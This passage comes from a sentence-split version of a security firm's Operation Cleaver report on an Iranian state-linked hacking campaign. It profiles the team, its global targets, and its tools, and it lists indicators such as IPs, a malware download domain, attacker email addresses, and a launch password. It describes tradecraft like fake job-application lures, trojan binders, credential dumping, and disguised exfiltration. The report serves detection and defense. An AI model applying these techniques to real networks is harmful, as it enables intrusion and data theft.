a profound way .", "1753": "Much of my passion for cybersecurity can be directly attributed to that fateful day .", "1754": "The United Flight 811 accident proves just how important it is to detect flaws before tragedy strikes .", "1755": "Preventable disasters like this are what motivates the Cylance team to create a safer world .", "1756": "We do everything we can to uncover the flaws in technologies before they damage the physical or cyber world .", "1757": "Our mission is simple : to protect the world .", "1758": "This report is an attempt to deliver on that mission .", "1759": "After tracking hackers both personally and professionally for more than 26 years , there is no doubt in my mind that the release of the information contained in the Operation Cleaver report is vital to the security of the world's critical infrastructure .", "1760": "The focus of the Operation Cleaver report is on one particular Iranian team we 've dubbed Tarh Andishan , the infrastructure they utilize , as well as their tactics , techniques and procedures .", "1761": "Roughly translated , '' Tarh Andishan '' means '' thinkers '' or '' innovators '' .", "1762": "This team displays an evolved skillset and uses a complex infrastructure to perform attacks of espionage , theft , and the potential destruction of control systems and networks .", "1763": "While our investigation is ongoing , and we presently have limited visibility inside many of the compromised networks , Cylance observed Tarh Andishan actively targeting , attacking , and compromising more than 50 victims since at least 2012 .", "1764": "Cylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this report , limiting our content to only that which can be definitively confirmed .", "1765": "However , we have speculated on the possible motivations behind these attacks , given our deep knowledge and understanding of the cyber landscape .", "1766": "We have made every effort to notify all affected entities prior to publishing this report .", "1767": "Additionally , all personally identifiable information about the members of Operation Cleaver has been withheld .", "1768": "We do n't care who the adversary is , where they work or reside , who they 're dating or what party photos they upload to Facebook \u2013 all we care about is preventing campaigns like Operation Cleaver from negatively affecting the real world .", "1769": "Iran is the new China .", "1770": "The group is believed to work from Tehran , Iran , although auxiliary team members were identified in other locations including the Netherlands , Canada , and the UK .", "1771": "The group successfully leveraged both publicly available , and customized tools to attack and compromise targets around the globe .", "1772": "The targets include military , oil and gas , energy and utilities , transportation , airlines , airports , hospitals , telecommunications , technology , education , aerospace , Defense Industrial Base ( DIB ) , chemical companies , and governments .", "1773": "During intense intelligence gathering over the last 24 months , we observed the technical capabilities of the Operation Cleaver team rapidly evolve faster than any previously observed Iranian effort .", "1774": "As Iran 's cyber warfare capabilities continue to morph , the probability of an attack that could impact the physical world at a national or global level is rapidly increasing .", "1775": "Their capabilities have advanced beyond simple website defacements , Distributed Denial of Service ( DDoS ) attacks , and Hacking Exposed style techniques .", "1776": "With minimal separation between private companies and the Iranian government , their modus operandi seems clear : blur the line between legitimate engineering companies and state- sponsored cyber hacking teams to establish a foothold in the world 's critical infrastructure .", "1777": "Iran 's rising expertise , along with their choice of victims , has compelled us to release this report sooner than we would have liked in order to expose Operation Cleaver to the world .", "1778": "The evidence and indicators of compromise we provide in this report will allow potentially unaware victims to detect and eliminate Cleaver 's incursions into their networks .", "1779": "Iran has been severely impacted by debilitating and extremely advanced malware campaigns since at least 2009 .", "1780": "These campaigns have targeted Iran's nuclear program , and oil and gas operations .", "1781": "Hacking campaigns sourced out of Iran are nothing new .", "1782": "Since the early 2000 's , the information security industry as a whole has tracked teams like the Iranian Cyber Army , which mainly focuses on patriotic hacking ( website defacements ) .", "1783": "After the release of Stuxnet , Iran 's motivations appear to have shifted .", "1784": "Retaliation for Stuxnet began almost immediately in 2011 with campaigns like the certificate compromises of Comodo and DigiNotar .", "1785": "These attacks served as a warning , showcasing the rapid evolution of Iran 's hacking skills .", "1786": "A major retaliation came in the form of 2012 's Shamoon campaign , which impacted RasGas and Saudi Aramco .", "1787": "It 's estimated that Shamoon impacted over 30,000 computer endpoints and cost the affected companies tens-of-thousands of hours recovering from the attacks .", "1788": "The direct financial impact from this retaliation and amount of downtime experienced were staggering .", "1789": "Shamoon was truly a watershed event for security defenders .", "1790": "It was the first glimpse into the real capabillity and intention of Iranian cyber operations .", "1791": "We see the same motivation and intent here in Operation Cleaver : establishing a beachhead for cyber sabotage .", "1792": "We saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil's Distributed Denial of Service ( DDoS ) attacks against US banks .", "1793": "Yet more backlash was witnessed with FireEye's exposure of Operation Saffron Rose , an espionage campaign executed by the Ajax Security Team in 2014 .", "1794": "In June 2013 , Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out '' non-stop '' attacks on '' [ Israel 's ] vital national systems '' including '' water , power and banking '' .", "1795": "The following September of 2013 , the Wall Street Journal accused Iran of hacking into unclassified U.S. Navy computers in San Diego 's NMCI ( Navy Marine Corp Intranet ) ,5 which we can confirm was part of Operation Cleaver .", "1796": "While previously reported operations attributed to Iran have largely focused on Defense Industrial Base ( DIB ) companies , the United States Federal Government , or targets in Middle Eastern countries , Operation Cleaver has instead focused on a wide array of targets , including energy producers and utilities , commercial airlines and airports , military intelligence , aerospace , hospitals , and even universities \u2013 with only ten of the targets based in the United States .", "1797": "Such broad targeting demonstrates to the world that Iran is no longer content to retaliate against the US and Israel alone .", "1798": "They have bigger intentions : to position themselves to impact critical infrastructure globally .", "1799": "The string cleaver is found several times in a variety of custom software used in Operation Cleaver , including : We believe our visibility into this campaign represents only a fraction of Operation Cleaver 's full scope .", "1800": "We believe that if the operation is left to continue unabated , it is only a matter of time before the world 's physical safety is impacted by it .", "1801": "While the disclosure of this information will be a detriment to our ability to track the activity of this group , it will allow the security industry as a whole to defend against this threat .", "1802": "As such , we are exposing this cyber campaign early in an attempt to minimize additional real-world impact and prevent further victimization .", "1803": "\u2022 Persian hacker names are used throughout the campaign including : Salman Ghazikhani , Bahman Mohebbi , Kaj , Parviz , Alireza , and numerous others .", "1804": "\u2022 Numerous domains used in the campaign were registered in Iran .", "1805": "\u2022 Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh Andishan , which translates to '' invention '' or '' innovation '' in Farsi .", "1806": "\u2022 Source netblocks and ASNs are registered to Iran .", "1807": "\u2022 Hacker tools warn when their external IP address traces back to Iran .", "1808": "\u2022 The infrastructure is hosted through Netafraz.com , an Iranian provider out of Isfahan , Iran .", "1809": "\u2022 The infrastructure utilized in the campaign is too significant to be a lone individual or a small group .", "1810": "We believe this work was sponsored by Iran .", "1811": "\u2022 US Military targets including NMCI in October 2013 .", "1812": "Confirmed targeting of global government entities .", "1813": "\u2022 Networks and systems targeted in critical industries like energy and utilities , oil and gas , and chemical companies .", "1814": "\u2022 Various global telecommunications , technology , healthcare , aerospace , and defense companies were breached as part of the operation .", "1815": "\u2022 The ability to build customized tools to compromise any target they choose .", "1816": "\u2022 Over the past two years , Cylance has collected over 8GB of data including over 80,000 files of exfiltrated data , hacker tools , victim logs , and highly sensitive reconnaissance data .", "1817": "\u2022 Data from sinkholed command and control servers has allowed us to track this active campaign .", "1818": "\u2022 Cylance is releasing more than 150 IOCs and samples associated with the Cleaver campaign to empower the security community to detect existing compromises in their own organizations , as well as potentially block future attacks from these teams .", "1819": "\u2022 This campaign continues Iran 's retaliation for Stuxnet , Duqu , and Flame .", "1820": "\u2022 This is a state-sponsored campaign .", "1821": "\u2022 There is a possibility that this campaign could affect airline passenger safety .", "1822": "\u2022 This campaign 's intentions may be to damage Industrial Control Systems ( ICS ) , Supervisory Control and Data Acquisition ( SCADA ) systems , and impact Critical Infrastructure and Key Resources ( CIKR ) .", "1823": "\u2022 This campaign could be a way to demonstrate Iran 's cyber capabilities for additional geopolitical leverage , due to the breadth and depth of their global targets .", "1824": "\u2022 There is an intense focus on CIKR companies in South Korea , which could give Iran additional clout in their burgeoning partnership with North Korea .", "1825": "In September 2012 , Iran signed an extensive agreement for technology cooperation agreement with North Korea , which would allow for collaboration on various efforts including IT and security .", "1826": "\u2022 Iran is recruiting from within the universities and potentially using 'hackers for hire ' .", "1827": "The Cleaver team targets some of the most sensitive global critical infrastructure companies in the world , including military , oil and gas , airlines , airports , energy producers , utilities , transportation , healthcare , telecommunications , technology , manufacturing , education , aerospace , Defense Industrial Base ( DIB ) , chemical companies and governments .", "1828": "Countries impacted include Canada , China , England , France , Germany , India , Israel , Kuwait , Mexico , Pakistan , Qatar , Saudi Arabia , South Korea , Turkey , United Arab Emirates , and the US .", "1829": "Unlike Stuxnet , no exotic exploitations ( such as 0-days ) were observed .", "1830": "We discovered over 50 victims in our investigation , distributed around the globe .", "1831": "Ten of these victims are headquartered in the US and include a major airline , a medical university , an energy company specializing in natural gas production , an automobile manufacturer , a large defense contractor , and a major military installation .", "1832": "The four targets in Israel and the five targets in Pakistan are comprised of education , aerospace , airports , airlines , healthcare and technology .", "1833": "Further victims were identified in numerous Middle Eastern countries as well as ones in Northern Europe including the UK , France , and Germany .", "1834": "Central America was not immune either with a large oil and gas company on the list .", "1835": "In fact , oil and gas was a particular focal point for the Cleaver team , going after no less than nine of these companies around the world .", "1836": "Universities were targeted in the US , India , Israel , and South Korea .", "1837": "They had a penchant for pictures , passports , and any specifc identifying information .", "1838": "Perhaps the most bone-chilling evidence we collected in this campaign was the targeting and compromise of transportation networks and systems such as airlines and airports in South Korea , Saudi Arabia and Pakistan .", "1839": "We were witnessed a shocking amount of access into the deepest parts of these companies and the airports in which they operate .", "1840": "Despite today 's trend toward attacker attribution , we believe it offers little real benefit to the day-to-day cyber defender .", "1841": "However , in this report we offer our observations on the sources of Operation Cleaver in order to benefit those that rely on attribution such as Law Enforcement .", "1842": "Operation Cleaver is believed to consist of at least 20 hackers and developers , collaborating on projects and missions to support Iranian interests .", "1843": "Many of the targets were predominately English-speaking and a majority of the team members were capable of reading and writing in English .", "1844": "We present evidence that this team is operating , at least in part , out of Iran and in the interests of Iran .", "1845": "The skills and behavior of the Operation Cleaver teams are consistent with , and in one case surpasses , Iran 's cyber capabilities as we know them today .", "1846": "For a complete list of IPs and domains related to this campaign , please refer to the Indicators of Compromise section .", "1847": "This IP address was also observed in multiple software configurations .", "1848": "This particular net block was used over an extended period of time , indicating these were under the Cleaver team's physical control .", "1849": "Additionally , prior netblocks used by the same team demonstrated to us that this was n't simply a case of proxying or '' island hopping '' .", "1850": "For more information see the Tarh Andishan section of this report .", "1851": "While this IP was this registered in the Netherlands , we believe they used Softlayer 's Citrix demo environment to launch these attacks which is consistent with proxying or '' island hopping '' .", "1852": "A number of Cleaver 's attack methods require a persistent server .", "1853": "In many cases , these servers were referenced by domain names .", "1854": "The following malicious domains are operated by this organization and are grouped by the registrant 's email address .", "1855": "As is typical with malicious domains , the Whois data for most of these domains contained falsified information .", "1856": "We managed to obtain a large collection of the internally developed tools used by the Cleaver team , many of which were developed by its members .", "1857": "Due to operational security failures , these tools contain information that provided us insight into their organization and operations .", "1858": "In the tool named Shell Creator 2 , there are three main components .", "1859": "The web shell is accessible by the shell client directly .", "1860": "The shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised computer .", "1861": "The shell client , which is developed in Java and is easily decompiled , is a simple interface with a feature to protect the operator from making a critical mistake .", "1862": "The country of origin is then shown to the user , to inform them of what country it appears they are connecting from .", "1863": "The assumed purpose of this feature is to ensure that a proper proxy is in use , and the real origin of the attacker is not revealed .", "1864": "After decompiling the shell client , we found the following code segment controlling the display of this IP location information .", "1865": "This code handles the XML response from freegeoip.net , and displays the information as different colors based on different attributes .", "1866": "For instance , if the string '' ERROR '' is in the response , the text is displayed with the color magenta .", "1867": "If the string IRAN is in the response , the text is displayed with the color red .", "1868": "It should be noted that no other country name contains the substring IRAN .", "1869": "This is done with Windows Credential Editor ( WCE ) and Mimikatz in combination with PsExec .", "1870": "Different versions of this malware contain ASCII art which names the authoring group as Zhoupin ( in '' leetspeak '' as '' Zh0up ! n '' ) .", "1871": "For more information on Net Crawler , see the Tactics , Techniques and Procedures section .", "1872": "TinyZBot is a bot written in C # and developed by the Cleaver team .", "1873": "It is the longest developed malware family discovered by this group , and has been used in campaigns for close to two years .", "1874": "How it operates can vary greatly from version to version .", "1875": "For a detailed technical analysis of TinyZBot , see the Tactics , Techniques and Procedures section .", "1876": "As TinyZBot is developed in C # , many versions can be decompiled to code very similar to their originals , including names of namespaces .", "1877": "We obtained multiple versions from which we were able to recover many of the original names of variables and namespaces .", "1878": "In a number of these samples , the primary namespace for TinyZBot is named ZhoupinCleaver .", "1879": "In every version of TinyZBot that is not obfuscated , there is a code base referred to as Cleaver .", "1880": "This code base is also shared in other malware developed by this organization , such as Csext .", "1881": "PrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January 2010 called MS10-015 , '' Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege '' , popularly known as the KiTrap0D exploit which was released publicly .", "1882": "The Cleaver team clearly modified the source code and compiled a new version .", "1883": "The only detectable modification was to change the original author 's name to instead display the following : Zhopin Exploit Team This is not the only case of this team relabeling others ' work as their own .", "1884": "Logger module is a component of the PVZ ( PVZ is shorthand for Parviz , one of the members of the Cleaver team ) bot tool chain .", "1885": "The logger module binary 's file description value is the following : Roughly translated from Persian , this text says : This text could potentially be a note intended to stay internal , or could be an attempt to persuade an unsuspecting victim to assume the file is not malicious .", "1886": "The Product Name value is GOOD FILE .", "1887": "For more information on the PVZ bot tool chain , see the Tactics , Techniques , and Procedures section .", "1888": "CCProxy is a publicly available proxy server for Windows , which can handle a variety of protocols .", "1889": "We do not believe that this organization was involved in the development or modification of CCProxy , but they have been observed using it .", "1890": "We recovered a CCProxy configuration , which exposed various operational details .", "1891": "The configuration allowed for remote connections , limited by a username as well as a limited IP range .", "1892": "The username was User-001 , which is the default value .", "1893": "The limited IP range covered one IP : 78.109.194.114 .", "1894": "This IP address is located in Iran , and is owned by Tarh Andishan .", "1895": "The configuration also indicates which address the CCProxy server should listen on for incoming connections such as web ( 80 ) and mail ( 25 ) .", "1896": "Log output from the network port scanning application NMAP was recovered from a staging server .", "1897": "The header of this NMAP log indicates that the computer used to run nbrute/nmap was set to Iran Daylight Time at the time of execution .", "1898": "With no known victims located in Iran , it is likely that this was executed on an attacker 's computer , and not on a victim 's computer .", "1899": "A configuration file for a Squid proxy server was recovered .", "1900": "Figure 12 : Squid configuration file showing the use of Tarh Andishan 's IP address .", "1901": "The net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC comment appended in order to make it look like it was part of the default configuration .", "1902": "It is likely this is the same reason a /28 net range was used , in order to not look like it was intended to only allow one IP .", "1903": "This would give the same access to resources accessible from the Squid proxy server to this Iranian IP address .", "1904": "Tarh Andishan is listed as the registrant for a number of small net blocks based upon the email address tarh.andishan ( at ) yahoo.com .", "1905": "The net blocks appear to rotate over time and registrant information is altered to accommodate ongoing operations and avoid potential public exposure .", "1906": "The networks are included below as well as the last time that net block was observed as active .", "1907": "There are many seemingly legitimate Tarh Andishan related companies inside Tehran , but strong connections to Iranian backing have been difficult to prove definitively .", "1908": "'' Tarh Andishan '' is often translated as '' Thinkers '' , '' Innovators '' and '' Inventors '' .", "1909": "The net blocks above have strong associations with state-owned oil and gas companies .", "1910": "These companies have current and former employees who are ICS experts .", "1911": "Tarh Andishan has been suspected in the past of launching attacks in the interest of Iran .", "1912": "In one of IranRedLine.org 's blog posts , the author speculates on Tarh Andishan 's involvement with the Iranian government by showing close proximity to SPND , the Organization of Defensive Innovation and Research ; however , the phone number listed under the registrant contact information has yet to be completely validated .", "1913": "During this investigation , we were able to compile a considerable amount of information on some of the members of this organization .", "1914": "The following profiles were built from reverse engineering , code analysis , open source intelligence , incident response and forensics work .", "1915": "Personally identifiable information about these members is not being shared publicly as it could endanger their lives and would be irresponsible .", "1916": "Parviz is a developer who worked on a variety of projects , and was primarily active in 2013 .", "1917": "His development skillset is based around his ability to develop in C/C++ .", "1918": "He has been observed using Visual Studio 2010 , and his tools are written exclusively for Windows .", "1919": "Some of his tools were found to be packed with ASPack .", "1920": "Parviz is the primary developer of the PVZ bot and multiple parts of its tool chain .", "1921": "Parviz is likely associated with the PVZ bot as his name in hardcoded into the PDB file paths .", "1922": "Nesha is one of the offensive members of this organization .", "1923": "A copy of an MS08-067 exploit developed in Python was recovered in which Nesha shamelessly replaced the original author 's name with his own .", "1924": "Nesha 's passwords very commonly include own handle .", "1925": "His passwords were frequently stored as hashes in backdoors , but common hash cracking methods were able to recover the plaintext versions .", "1926": "His observed password use is as follows : Cylance observed Nesha participating in compromises involving the following techniques : Nesha has additionally been identified using a variety of internally developed tools as well as the following publicly available tools : Alireza appears to be one of the senior developers of this organization .", "1927": "His tools are commonly developed in C++ , Java , and C # ( desktop and ASPX ) .", "1928": "Alireza 's code appears to be reused internally on projects such as TinyZBot .", "1929": "Alireza appears to be using a version control system for his code , and it is likely that others are using the same system .", "1930": "Based on the paths , the version control system in use is likely Apache 's Subversion .", "1931": "Use of a version control system is indicative of code sharing , but the use of an older system like Subversion , along with other evidence , suggests there is not a large amount of collaboration on projects and likely one developer working on each project at a time .", "1932": "This is not behavior typical of a professional development team .", "1933": "Alireza 's C # tools include the following techniques : Alireza 's Java tools include the following techniques : Alireza 's C++ tools include the following techniques : kaJ is a .NET", "1934": "developer , and has only been observed working in C # .", "1935": "He has less English language proficiency than others in the organization , and likely has a supplemental role during compromises .", "1936": "He has been observed developing tools which cater to specific challenges in a compromise .", "1937": "His notable project was named Net Crawler , and a technical analysis of this tool can be found in the Tactics , Techniques and Procedures section .", "1938": "Thanks to a recovered test configuration for Net Crawler , we were able to determine that kaJ 's development computer has the name dev-castle , where he has the username kaJ and the password oaolrJ @ vad .", "1939": "kaJ is believed to be the creator of the Zhoupin ASCII art displayed in Net Crawler .", "1940": "kaJ 's projects include the following techniques .", "1941": "Jimbp is a .NET", "1942": "developer with minimal experience .", "1943": "His projects appear to be supplemental to TinyZBot and are very simplistic .", "1944": "It is believed he is the developer of the project Binder1 .", "1945": "This project was a simple malware binder which required manual configuration when compiling .", "1946": "His other work included creating a new service wrapper for TinyZBot .", "1947": "Of course many associated Iranian hacker teams have been identified in public and private security circles .", "1948": "Some of the teams publicly known today include Iranian Cyber Army , Ashiyane , Islamic Cyber Resistance Group , Izz ad-Din al-Qassam Cyber Fighters , Parastoo , Shabgard , Iran Black Hats and many others .", "1949": "However , even though the TTPs of the Cleaver team have some overlap to techniques used by Iranian Cyber Army ( botnets ) , Ashiyane ( SQL injection ) and Syrian Electronic Army ( phishing and RATs ) , we believe this is largely the work of a new team .", "1950": "Some connections to Ashiyane were discovered in our investigations including a reference to hussein1363 , who had prior ties to the hacker group .", "1951": "Additional connections between team members and individuals exist but are predominantly speculative and have only been shared with law enforcement .", "1952": "Ultimately we believe the Cleaver team is a mix of existing team members and new recruits pulled from the universities in Iran .", "1953": "The Cleaver campaign used a variety of methods in multiple stages of attacks .", "1954": "In this section we'll cover the commonly observed methods during different stages of the attack .", "1955": "The initial compromise gets the attackers their first foothold into the target network .", "1956": "Once the ability to execute arbitrary code has been established , an attacker 's job becomes quite a bit easier .", "1957": "Since the vector of initial compromise is usually determined by what is vulnerable on the target , we 'll cover just a few of the techniques we 've seen Operation Cleaver use to initiate the compromise .", "1958": "It is made possible by a lack of input sanitization by the vulnerable application before supplying that input into a SQL database query .", "1959": "Operation Cleaver has employed this technique numerous times across different organizations .", "1960": "The domain EasyResumeCreatorPro.com was registered and a website setup which was a direct copy of a legitimate website at winresume.com .", "1961": "This is how the original site looked : That 's not all they copied .", "1962": "A binder is an application , which combines two executables ( desired software and malware ) into a single executable .", "1963": "This attack evolved to appear more legitimate .", "1964": "The attackers made the victims feel like they had a pending job opportunity at the industrial conglomerate Teledyne .", "1965": "These domains included other companies as they tried to hit a wider audience .", "1966": "Once all the forms are filled out , the user goes to the submission form .", "1967": "This method is particularly effective not only because of its level of deception , but even if the victim suspects that they are infected with malware , they are not as likely to speak up about it , as they would need to explain why they were submitting a job application for another company .", "1968": "This team did not utilize any novel methods of privilege escalation , but they were observed using a variety of publicly known exploits .", "1969": "This vulnerability and the corresponding exploit were discovered and developed in 2010 .", "1970": "The plagiarized version used in Operation Cleaver was compiled in May 2013 , with a slight modification to the public source code .", "1971": "This modification changed the author 's details to Zhopin Exploit Team .", "1972": "Two of these tools used by Cleaver are Mimikatz and Windows Credential Editor .", "1973": "These applications are zhMimikatz and MimikatzWrapper .", "1974": "These applications store multiple versions of Mimikatz in their resources .", "1975": "This technique is uncommon in malware and shows the advanced skillset of the Cleaver team .", "1976": "Both tools were developed in C # .", "1977": "In the following examples , the computer name is TheComputerName , the username of the logged in user is TheUser , and that user 's password is ThePassword .", "1978": "At the time of execution , the system only has its own credentials available and no cached network credentials .", "1979": "Output from MimikatzWrapper is essentially the same as zhMimikatz , despite being a different Visual Studio project .", "1980": "It has the ability to do this with both Windows Credential Editor and Mimikatz .", "1981": "Any credentials found are reported back to the original infection .", "1982": "The following is a sample of some of the recovered results of Net Crawler executing on a live network : A more in depth analysis of Net Crawler , as part of the A Study in Bots series , will be available on Cylance 's blog .", "1983": "This vulnerability has been patched since October 2008 , but many networks have failed to update their systems even to this day .", "1984": "Operation Cleaver used a plagiarized version of a publicly available exploit for this vulnerability developed in Python .", "1985": "Someone in the Cleaver team ( presumed to be Nesha ) modified the exploit to read '' By Nesha '' .", "1986": "It makes use of WinPcap and is developed in C. Compared to some other publicly available ARP cache poisoning utilities , Jasus is poorly developed and without many useful features .", "1987": "Cain & Abel is a publicly available toolkit , which covers a wide range of functionality that assists attackers once they have compromised a node on a network .", "1988": "This is a versatile technique as it does not require any additional software which could be detected .", "1989": "NetCat is a network tool which has many valid purposes but can also be used for malicious purposes .", "1990": "NetCat 's network communications are in plaintext , and could be viewed by an egress filter looking to block the exfiltration of sensitive information .", "1991": "The use of NetCat was later replaced with zhCat .", "1992": "zhCat is a tool developed by the Operation Cleaver team which operates similarly to NetCat .", "1993": "The command line help ( of a particular version ) shows the following options : Multiple obfuscation/encryption methods are available .", "1994": "The \u2013h argument enables HTTP mode .", "1995": "For instance , if the attackers set up a zhCat instance listening on port 1000 on 192.168.116.128 in HTTP mode , the client instance of zhCat would use the following command : The server instance would use the following command : When we run both of these , we can send information just by typing it into the terminal of the running application .", "1996": "Information can be supplied by standard input .", "1997": "Note : research into ebizmba.com did not turn up any additional evidence of being involved with the development of zhCat .", "1998": "These keys are stored inside zhCat .", "1999": "PLink is one of the many utilities provided in the PuTTY ( SSH ) suite , which has many benign purposes .", "2000": "It is capable of communicating over various protocols , the most notable being SSH .", "2001": "The SSH protocol is a heavily utilized encrypted protocol , most commonly used for remote administration of UNIX based operating systems .", "2002": "PLink is designed to implement some of the SSH functions related to forwarding traffic as well as other functionality .", "2003": "The known recipient addresses of this information were testmail00001 ( at ) yahoo.com and TerafficAnalyzer ( at ) yahoo .", "2004": "com .", "2005": "In order to deceive anyone reading these emails , they made them appear to be a spam message that most would not think twice about .", "2006": "For more information about TinyZBot , see the Persistence section .", "2007": "This bot is the longest developed malware we have analyzed from this organization .", "2008": "The earliest known version was compiled in January 2013 and we continued to see new versions being created actively .", "2009": "TinyZBot was developed with the clear intention of targeted campaigns .", "2010": "The name TinyZBot is assumed to be referring to this project as a less versatile version of the ZeuS botnet , although it does not exhibit the major browser injection features of ZeuS .", "2011": "To be clear , TinyZBot shares no code with ZeuS or its variants , and is developed in a different programming language .", "2012": "The majority of the code in TinyZBot was created by Cleaver .", "2013": "TinyZBot supports a wide array of features that continually evolved over time .", "2014": "For the evolution of features , see the History section .", "2015": "Potential reasons for using SOAP are : 1 .", "2016": "SOAP-based communications are simple to implement in C # .", "2017": "2 .", "2018": "As part of SOAP communications , a URI is specified .", "2019": "This is internal to the sub-protocol , and does not necessarily reflect the URI of the host running the SOAP server ( ASMX file ) .", "2020": "In the case of TinyZBot , and many examples for developing SOAP applications , this URI is tempuri.org .", "2021": "The result of this is a cryptographically hashed version of the server time ( which must be obtained through a SOAP query ) , the TinyZBot 's GUID , and the TinyZBot 's AppUsageID ( campaign identifier ) .", "2022": "The server time lookup query invokes the SOAP command GetServerTime .", "2023": "The command file downloaded in this example is as follows : The first line is a timestamp of the command .", "2024": "The TinyZBot command parser ignores it .", "2025": "There are additional SOAP commands , but they will not be covered in detail .", "2026": "The following is a list of all the SOAP commands : CheckFileMD5 , GetFile , GetFileList , GetServerTime , UploadFile .", "2027": "An additional method was used for earlier versions .", "2028": "Many of the images identified were of the popular Lebanese singer and actress Haifa Wehbe .", "2029": "The earliest known version on TinyZBot was compiled on January 27 , 2013 .", "2030": "This early version had very little functionality .", "2031": "The sender email address was dyanachear ( at ) beyondsys.com and emails were destined for testmail00001 ( at ) yahoo.com .", "2032": "The following iteration compiled on March 12 , 2013 , only contained minor bug fixes .", "2033": "The next version was compiled on April 24 , 2013 .", "2034": "This version starts to look more like an average bot .", "2035": "This new command and control protocol allowed for the addition of quite a few other features .", "2036": "The SOAP API used a dynamic password mechanism , which required the computation of a simple key in order to access certain parts of the API .", "2037": "There were also some changes , which looked to be bug fixes , such as limiting the number of times sending an email could fail .", "2038": "On May 14 , 2013 , we noticed a change which assisted in the identification of active targets .", "2039": "At this time , the AppUsageId was total0 , but later we observed names , which aligned with active targets .", "2040": "On June 17 , 2013 , there was an addition that allowed for the loading of configuration data from the PE 's resources .", "2041": "At this time , it was limited to the exfiltration email address .", "2042": "This version was not obfuscated with SmartAssembly We do not see a new version of TinyZBot until June 7 , 2014 .", "2043": "There are quite a few notable improvements , but nowhere near enough to indicate consistent development on the project for a year .", "2044": "A new string encryption class is added , but the code was copied and pasted from a Microsoft example .", "2045": "The emailing features were removed , but the classes which previously contained them were still present but empty .", "2046": "Many more options were enabled to be loaded from PE resources .", "2047": "The ability to add PE resources was added .", "2048": "Another version was compiled on June 7 , 2014 , with no feature difference .", "2049": "On June 17 , 2014 , we see2the first instance of Binder1 , which is aptly named , as it is a binder .", "2050": "The legitimate application used in this version of Binder1 was compiled on August 22 , 2013 , and is a self-extracting archive of desktop wallpapers , including an image from the game Mirror's Edge .", "2051": "The TinyZBot included was the version compiled on June 7 , 2014 .", "2052": "On August 2 , 2014 , we see another version without SmartAssembly obfuscation .", "2053": "Three items were compiled on August 18 , 2014 .", "2054": "Two of them are TinyZBot binaries , which contain a minor key logging bug fix .", "2055": "The third is a new Binder1 instance , which contains one of the TinyZBot instances compiled that day .", "2056": "The legitimate application included in this binder is called Easyresumecreator and is a legitimate application named EasyR\u00e9sum\u00e9CreatorPro .", "2057": "This version targeted a major Saudi Arabian oil company .", "2058": "From August 23 to August 26 , 2014 , new versions of TinyZBot were compiled with the AppUsageIds targeting major oil and gas companies in Qatar and Kuwait , Ministries of Foreign Affairs in the Persian Gulf , and a major airline holding company in UAE .", "2059": "These versions of TinyZBot moved towards a more modular architecture where each component was in its own .NET", "2060": "assembly .", "2061": "All of these were included in their own Binder1 instance , which also dropped Easyresumecreator .", "2062": "There also seem to be improved software engineering practices in many locations .", "2063": "On August 25 , 2014 , the version compiled on August 18 was submitted to VirusTotal in a ZIP archive located at http : //dl.doosan-job ( dot ) com/cv/EasyResumeCreator- v2.0.zip .", "2064": "On September 9 , 2014 , a ZIP file containing TinyZBot and a configuration targeting a major US university with its AppUsageId was created .", "2065": "This was discovered on an anonymous FTP server in the same IP range as dl.doosan-job ( dot ) com along with other malware .", "2066": "From September 11 through September 17 , 2014 , some TinyZBot components were compiled , along with a new dropper .", "2067": "When executed , the user is prompted to enter personal information , and at the end is given a button to submit the r\u00e9sum\u00e9 to Teledyne , although nothing is actually submitted .", "2068": "The AppUsageIds for these versions target a major US-based university as well as an Israeli aerospace company .", "2069": "The service runs with the name Network Connectivity Manager .", "2070": "TinyZBot , as well as some other tools ( Csext , Net Crawler ) initially would not run without a command line parameter set .", "2071": "This command line parameter was opensesemi which is often stored in the application 's code in an obfuscated manner .", "2072": "The binders and droppers for TinyZBot provided this command line argument and others when executing .", "2073": "TinyZBot uses a dynamic mutex .", "2074": "This was accomplished by combining a static preset prefix with the active process ID .", "2075": "This backdoor does not require authentication , and its use appears to be straightforward .", "2076": "There will be a detailed analysis of these backdoors posted to Cylance 's blog in the future .", "2077": "PVZ is a name for a set of executables used together to create a botnet .", "2078": "The name PVZ was assigned by us as this is one of the few tools this organization has not named themselves .", "2079": "Communication is primarily unidirectional , as little information is provided from the bot to its command and control server .", "2080": "The debug file path for PVZ-In is : PVZ-In has been observed using the file name ossisvc.exe .", "2081": "The debug file path for PVZ-Out is : PVZ-Out has been observed with the file name osppsvc.exe .", "2082": "Targeting information is supplied via command line parameters .", "2083": "The debug file path for SYN Flooder is : SYN Flooder has been observed using the name ossysvc.exe .", "2084": "Logger Module has been observed using the name ospcsvc.exe .", "2085": "Its primary functionality is based on commands supplied by its configuration file .", "2086": "The configuration file is able to store specific commands , which are intended to run at particular times .", "2087": "If inside the United States , contact the Federal Bureau of Investigation ( FBI ) via either your local FBI team or FBI CYWATCH at 1-855-292-3937 or cywatch @ ic.fbi.gov .", "2088": "2 .", "2089": "If outside the United States , contact your local , district , state or federal law enforcement authorities .", "2090": "3 .", "2091": "If you have visibility into the attacks on your company and the tools and expertise to track them down , leverage the IOCs in Appendix A to identify their presence in your network , prevent them from expanding the scope of the compromise , and remove their access immediately .", "2092": "4 .", "2093": "If you do NOT have visibility into the attacks , need help identifying an existing successful compromise in your organization , or more importantly wish to prevent this attack or attacks similar to Operation Cleaver , please contact your security provider .", "2094": "5 .", "2095": "If you wish to contact Cylance for additional details not available in this report , please email opcleaver @ cylance.com .", "2096": "6 .", "2097": "If you would like to learn more about Cylance products and professional services , or discuss how Cylance can mitigate Operation Cleaver 's impact to your organization , please contact us directly .", "2098": "Iran in 2014 can probably be best described as galvanizing .", "2099": "They have long been an '' enemy '' of the west , and the United States in particular , but today 's headlines include a variety of topics from nuclear talks to human rights to terrorism to cyber hacking .", "2100": "Iran continues to be extremely active on the global stage \u2013 and thereby on the radar of every superpower .", "2101": "Iran 's cyber sophistication has grown rapidly since the dawn of Stuxnet and they have used hard dollars combined with national pride to help build their cyber army .", "2102": "Few doubt their commitment as a government and nation state to funding and recruiting cyber warriors to infiltrate and damage their enemies .", "2103": "And it has been commonly postulated that almost all activity since 2010 coming out of Iran is associated with retaliation for Stuxnet/Duqu/Flame , which seems natural given the 